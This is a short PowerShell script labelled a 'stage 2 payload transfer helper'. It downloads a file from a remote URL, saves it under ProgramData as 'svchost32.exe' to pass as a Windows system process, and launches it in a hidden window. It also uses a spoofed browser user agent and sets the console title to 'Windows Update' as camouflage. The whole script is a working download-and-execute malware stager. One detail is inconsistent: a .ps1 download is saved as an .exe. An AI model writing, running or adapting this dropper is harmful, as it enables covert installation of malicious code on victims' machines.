<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.

.EXAMPLE
    PS> .\stage2.ps1
#>
$TransferUrl = 'https://internal.corp/updater.ps1'
$WorkingPath = "C:\ProgramData\svchost32.exe"
$TransferTimeout = 172
$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $TransferResult = Invoke-PayloadFetch -SourceUrl $TransferUrl -DestinationPath $WorkingPath -TimeoutSec $TransferTimeout -UserAgent $RequestAgent
    if ($TransferResult) {
        Start-Process -FilePath $WorkingPath -WindowStyle Hidden
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

$StageMarker = "stage-39"
$Host.UI.RawUI.WindowTitle = "Windows Update"
